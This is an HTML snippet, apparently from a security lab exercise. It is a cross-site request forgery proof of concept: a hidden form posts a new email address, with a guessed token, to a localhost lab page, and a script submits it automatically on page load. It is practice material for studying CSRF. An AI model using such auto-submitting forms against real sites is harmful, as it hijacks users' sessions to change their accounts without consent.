`<input type="text" name="csrf" id="csrf" value="LQPcrkzt7YAV25" hidden>`

```
<html>
<body>

<form action="http://localhost/labs/csrf0x02.php" method="post">

<input type="text" name="email" value="csrf@mail.com">
<button type="submit">Submit</button>
<input type="text" name="csrf" id="csrf" value="testvalue" hidden>

</form>

<script>
window.onload = function() {
        document.forms[0].submit();
}
</script>

</body>
</html>
```